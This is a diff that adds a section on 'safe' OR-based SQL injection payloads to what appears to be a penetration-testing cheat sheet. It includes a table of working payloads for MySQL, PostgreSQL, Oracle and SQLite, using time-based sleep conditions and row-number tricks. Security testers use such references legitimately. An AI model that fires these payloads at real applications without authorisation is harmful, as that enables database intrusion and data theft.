@@ -61,6 +61,47 @@ I wrote about the reasons why in <a href="https://tcm-sec.com/avoid-or-1-equals-
 
 If you have a "valid value", there is practically no need for an OR &lt;true&gt; when doing SQL injections. A valid value is one which returns a "positive" result in the application, for example a search term that returns 1 or more results, an ID that maps to an actual resource (e.g. user, product, etc.), or a valid username.
 
+## "Safe" OR-Based Payloads
+
+Somewhat contrary to the previous section, there are actually "safe" OR-Based payloads which can be used without a valid value, and should only return the first row of the query results. I explain how these payloads work in <a href="https://www.youtube.com/watch?v=EpCA4HF-aUM">this video</a>, with credit to <a href="https://x.com/coffinxp7">Coffin</a> &amp; <a href="https://x.com/moore_rich">Richard Moore</a> for the initial research.
+
+<table>
+<thead>
+<tr>
+<th>Variant</th>
+<th>Payload</th>
+<th>Credit</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="span">MySQL</td>
+<td>' OR IF((NOW()=SYSDATE()),SLEEP(1),1)='0</td>
+<td><a href="https://x.com/coffinxp7">Coffin</a></td>
+</tr>
+<tr>
+<td class="span">PostgreSQL</td>
+<td>' OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) &lt; '0:0:1') THEN (SELECT '1'||PG_SLEEP(1)) ELSE '0' END)='1</td>
+<td>Tib3rius</td>
+</tr>
+<tr>
+<td class="span">MSSQL</td>
+<td>No Known Payload</td>
+<td>&nbsp;</td>
+</tr>
+<tr>
+<td class="span">Oracle</td>
+<td>' OR ROWNUM = '1</td>
+<td><a href="https://x.com/moore_rich">Richard Moore</a></td>
+</tr>
+<tr>
+<td class="span">SQLite</td>
+<td>' OR ROWID = '1</td>
+<td>Tib3rius</td>
+</tr>
+</tbody>
+</table>
+
 ## Break & Repair Method
 
 A simplistic but generally reliable method for finding basic SQL injections.
